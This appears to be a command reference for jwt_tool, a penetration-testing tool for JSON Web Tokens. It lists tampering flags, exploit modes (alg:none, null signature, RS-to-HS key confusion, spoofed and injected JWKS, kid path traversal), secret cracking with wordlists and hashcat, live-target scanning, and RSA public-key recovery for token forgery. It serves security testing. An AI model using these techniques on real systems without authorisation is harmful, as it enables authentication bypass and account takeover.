# jwt_tool reference (ticarpi/jwt_tool v2.x)

Install: `pip3 install -r requirements.txt` in the repo clone, or the Kali
package. Run as `jwt_tool` or `python3 jwt_tool.py`. First run creates
`~/.jwt_tool/jwtconf.ini` plus a local RSA/EC keypair and JWKS used by the
exploit modes. Logs every token it generates to `~/.jwt_tool/logs.txt` with a
`jwttool_<hash>` ID so you can map scan hits back to exact tokens.

## Basic usage

```
jwt_tool <JWT>                 # decode header/payload/signature, show claim analysis
jwt_tool -t <url> ... <JWT>    # same, but send requests to a live target
```

Token can also come from a stored response: `jwt_tool -rf response.txt` scans a
file for JWTs.

## Tampering / signing

| Flag | Meaning |
|---|---|
| `-T` | Interactive tamper mode: menu-driven edit of header and payload claims, then pick a signing option (keep sig, no sig, HS/RS/EC/PS sign, exploits). |
| `-I` | Inject/update claims non-interactively. Combine with the four below. Repeatable. |
| `-pc <name>` / `-pv <value>` | Payload claim name/value to set (pairs; repeat for multiple claims). |
| `-hc <name>` / `-hv <value>` | Header claim name/value to set (e.g. `-hc kid -hv '../../dev/null'`). |
| `-S <alg>` | Sign the token: `hs256|hs384|hs512|rs256|rs384|rs512|es256|es384|es512|ps256|ps384|ps512`. |
| `-p <password>` | HMAC secret for `-S hs*` (use `-p ''` for an empty key). |
| `-k <keyfile>` | Key file for HMAC signing from file. |
| `-pr <privkey.pem>` | Private key for RS/ES/PS signing. |
| `-V` | Verify signature. With `-pk pubkey.pem` (public key) or `-jw jwks.json` (JWKS file). |

Examples:

```
jwt_tool <JWT> -I -pc role -pv admin                       # tamper, keep original (now-invalid) sig
jwt_tool <JWT> -I -pc exp -pv 1999999999 -S hs256 -p 'secret1'
jwt_tool <JWT> -I -hc kid -hv 'key2' -pc sub -pv 'admin' -S hs256 -p 'aaa'
jwt_tool <JWT> -S rs256 -pr my_private.pem
```

`-I` alone re-emits the token unsigned-modified; chain `-I` with `-X`/`-S` to
tamper **and** exploit/sign in one shot.

## Exploits (`-X`)

| Flag | Attack |
|---|---|
| `-X a` | **alg:none** — strips the signature, emits variants with `alg` set to `none`, `None`, `NONE`, `nOnE`. |
| `-X n` | **Null signature** — keeps header/payload, empties the signature segment. |
| `-X b` | **Blank password** — signs HS256 with the empty string as key. |
| `-X k -pk public.pem` | **Key confusion (RS→HS)** — re-signs HS256 using the server's RSA public key PEM as the HMAC secret. Requires `-pk`. |
| `-X s -ju <url>` | **Spoof JWKS** — generates a keypair, signs the token, sets `jku` to `<url>`, and writes the JWKS JSON you must host there. |
| `-X i` | **Inject inline JWKS** — embeds a self-generated public JWK in the token header (`jwk` claim) and signs with the matching private key (CVE-2018-0114 pattern). |

All exploit tokens are printed and logged; combine with `-I -pc/-pv` to set the
claims you actually want before the exploit signing is applied.

## Cracking (`-C`)

| Flag | Meaning |
|---|---|
| `-C -d <wordlist>` | Dictionary attack against an HS256/384/512 signature. |
| `-C -p <guess>` | Test a single secret. |

Success line: `[+] <secret> is the CORRECT key!`. Good lists:
`jwt.secrets.list` (wallarm/jwt-secrets), SecLists `scraped-JWT-secrets.txt`,
`rockyou.txt`. For GPU speed export the token and use
`hashcat -a 0 -m 16500 jwt.txt wordlist` — the whole JWT string is the hash.

## Scanning modes (`-M`) and live-target options

| Flag | Meaning |
|---|---|
| `-M pb` | Playbook audit: decode, claim analysis, then the standard bypass battery (alg:none, null sig, blank key, spoofed/injected JWKS, exp checks) against the target. |
| `-M at` | All tests: playbook + every exploit + claim fuzzing. |
| `-M er` | Fuzz **existing** claims with values from `~/.jwt_tool/` fuzz lists. |
| `-M cc` | Inject and fuzz **common** claims not present in the token. |
| `-t <url>` | Target URL to send each test token to. |
| `-rh '<Header: value>'` | Request header; repeatable. Put the literal string `jwt_tool` where the token goes: `-rh 'Authorization: Bearer jwt_tool'`. |
| `-rc '<name=value>'` | Request cookie(s); same `jwt_tool` substitution. |
| `-pd '<data>'` | POST body (switches request to POST); same substitution. |
| `-cv '<string>'` | Canary: a string that appears only in a *successful* (authenticated) response. Without it, matching is on status codes. |
| `-np` | Don't use the proxy configured in jwtconf.ini. |
| `-nr` | Don't follow redirects. |
| `-M pb -cv ...` output | Hits are reported with the `jwttool_<id>`; look the token up in `~/.jwt_tool/logs.txt` and replay it manually to confirm. |

Example full scan:

```
jwt_tool -t 'https://api.example.com/v1/me' \
         -rh 'Authorization: Bearer jwt_tool' \
         -rh 'X-Api-Version: 2' \
         -cv '"email"' -M at <JWT>
```

## Config file: `~/.jwt_tool/jwtconf.ini`

Persistent settings per environment: proxy (default Burp `127.0.0.1:8080` —
disable with `-np` or edit), default headers, the auto-generated keypair paths
(`prv`/`pub`), the JWKS served for `-X s` (`jwks` name, `kid` used), and
locations of the claim fuzz lists used by `-M er`/`-M cc`. Edit `jwks_url_` style
entries so spoofed tokens point at your hosting by default.

## Companion: recovering an RSA public key from two tokens

When no JWKS/cert is exposed, silentsignal's **rsa_sign2n** (`jwt_forgery.py`,
or the dockerized `sig2n`) computes RSA public-key candidates from two RS256
tokens signed by the same key (GCD of signature^e - message values):

```
python3 jwt_forgery.py <token1> <token2>
docker run -it ttervoort/jwt-forgery <token1> <token2>
```

It emits candidate `*.pem` files in both encodings **and** ready-made HS256
tokens signed with each candidate — replay those directly; whichever is
accepted identifies the real public key. Feed that PEM to `jwt_tool -X k -pk`.
